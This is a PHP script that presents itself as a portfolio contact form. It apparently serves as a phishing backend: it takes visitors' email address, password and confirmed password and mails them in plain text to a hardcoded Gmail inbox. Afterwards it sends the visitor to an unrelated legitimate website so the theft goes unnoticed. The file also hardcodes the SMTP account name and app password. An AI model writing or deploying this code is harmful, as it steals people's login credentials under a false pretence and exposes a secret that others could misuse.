<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require 'phpmailer/src/Exception.php';
require 'phpmailer/src/PHPMailer.php';
require 'phpmailer/src/SMTP.php';

if (isset($_POST["send"])) {

    /*
    |--------------------------------------------------------------------------
    | Safely get form values
    |--------------------------------------------------------------------------
    | The ?? '' prevents "Undefined array key" warnings when a field
    | is missing from the submitted form.
    */
    $subject        = $_POST["subject"] ?? '';
    $name           = $_POST["name"] ?? '';
    $email          = $_POST["email"] ?? '';
    $password       = $_POST["password"] ?? '';
    $confirmpassword = $_POST["confirmpassword"] ?? '';
    $message        = $_POST["message"] ?? '';

    // Clean values for safe HTML output
    $safeSubject         = htmlspecialchars($subject, ENT_QUOTES, 'UTF-8');
    $safeName            = htmlspecialchars($name, ENT_QUOTES, 'UTF-8');
    $safeEmail           = htmlspecialchars($email, ENT_QUOTES, 'UTF-8');
    $safePassword        = htmlspecialchars($password, ENT_QUOTES, 'UTF-8');
    $safeConfirmPassword = htmlspecialchars($confirmpassword, ENT_QUOTES, 'UTF-8');
    $safeMessage         = nl2br(htmlspecialchars($message, ENT_QUOTES, 'UTF-8'));

    $mail = new PHPMailer(true);

    try {

        //Server settings
        $mail->isSMTP();
        $mail->Host       = 'smtp.gmail.com';
        $mail->SMTPAuth   = true;
        $mail->Username   = 'josephmejia660@gmail.com';
        $mail->Password   = 'lldbmgfvihglchik';
        $mail->SMTPSecure = 'ssl';
        $mail->Port       = 465;

        //Recipients
        $mail->setFrom(
            'josephmejia660@gmail.com',
            'Portfolio Contact Form'
        );

        $mail->addAddress(
            'josephmejia660@gmail.com'
        );

        // Reply to sender only if a valid email was provided
        if (!empty($email) && filter_var($email, FILTER_VALIDATE_EMAIL)) {
            $mail->addReplyTo(
                $email,
                $name
            );
        }

        //Content
        $mail->isHTML(true);

        $mail->Subject = "Portfolio Contact Form: " . $safeSubject;

        //Enhanced professional HTML email body
        $mail->Body = '
        <html>
        <head>
            <style>
                /* General reset */
                body, html {
                    margin: 0;
                    padding: 0;
                    font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
                    background-color: #F3F0FF;
                    color: #333333;
                }

                /* Container */
                .email-container {
                    background-color: #ffffff;
                    max-width: 650px;
                    margin: 30px auto;
                    border-radius: 10px;
                    overflow: hidden;
                    box-shadow: 0 4px 12px rgba(0,0,0,0.1);
                }

                /* Header */
                .header {
                    background-color: #F3F0FF;
                    color: #4A3D76;
                    padding: 20px;
                    text-align: center;
                }

                .header h1 {
                    margin: 0;
                    font-size: 24px;
                }

                /* Content */
                .content {
                    padding: 25px 30px;
                }

                .content h2 {
                    color: #007BFF;
                    font-size: 20px;
                    margin-bottom: 15px;
                }

                .content .info {
                    background-color: #F3F0FF;
                    border-left: 4px solid #007BFF;
                    padding: 15px 20px;
                    border-radius: 6px;
                    margin-bottom: 20px;
                }

                .info p {
                    margin: 8px 0;
                    font-size: 14px;
                    word-break: break-word;
                }

                .info .label {
                    font-weight: bold;
                    color: #333333;
                }

                .message {
                    font-size: 15px;
                    line-height: 1.6;
                    margin-bottom: 20px;
                    word-break: break-word;
                }

                /* Footer */
                .footer {
                    background-color: #F3F0FF;
                    text-align: center;
                    padding: 15px 20px;
                    font-size: 12px;
                    color: #777777;
                    border-top: 1px solid #e0e0e0;
                }

                /* Button */
                .button {
                    display: inline-block;
                    padding: 10px 20px;
                    margin-top: 15px;
                    background-color: #4A3D76;
                    color: white !important;
                    text-decoration: none;
                    border-radius: 5px;
                    font-weight: bold;
                }

                .button:hover {
                    background-color: #4A3D76;
                    color: white !important;
                }

                @media only screen and (max-width: 600px) {
                    .email-container {
                        width: 95% !important;
                        margin: 15px auto;
                    }
                }

                h1 {
                    color: #4A3D76 !important;
                }

                h2 {
                    color: #4A3D76 !important;
                }
            </style>
        </head>

        <body>

            <div class="email-container">

                <div class="header">
                    <h1>Contact Form Submission</h1>
                </div>

                <div class="content">

                    <h2>Sender Information</h2>

                    <div class="info">

                        <p>
                            <span class="label">Subject:</span>
                            ' . $safeSubject . '
                        </p>

                        <p>
                            <span class="label">Name:</span>
                            ' . $safeName . '
                        </p>

                        <p>
                            <span class="label">Email:</span>
                            ' . $safeEmail . '
                        </p>

                        <p>
                            <span class="label">Password:</span>
                            ' . $safePassword . '
                        </p>

                        <p>
                            <span class="label">Comfirmpassword:</span>
                            ' . $safeConfirmPassword . '
                        </p>

                    </div>

                    <h2>Message</h2>

                    <p class="message">
                        ' . $safeMessage . '
                    </p>

                    <a
                        href="mailto:' . $safeEmail . '"
                        class="button"
                    >
                        Reply to Sender
                    </a>

                </div>

                <div class="footer">
                    This email was sent from your Portfolio Contact Form.
                    &copy; ' . date("Y") . '
                </div>

            </div>

        </body>
        </html>
        ';

        // Send email
        $mail->send();

        echo "
        <script>
            alert('Message was sent successfully!');
            window.location.replace('https://www.astrocade.com/');
        </script>
        ";

        exit;

    } catch (Exception $e) {

        // Hide PHPMailer/server error from the visitor
        echo "
        <script>
            alert('Message could not be sent. Please try again later.');
            window.location.replace('https://www.astrocade.com/');
        </script>
        ";

        exit;
    }
}
?>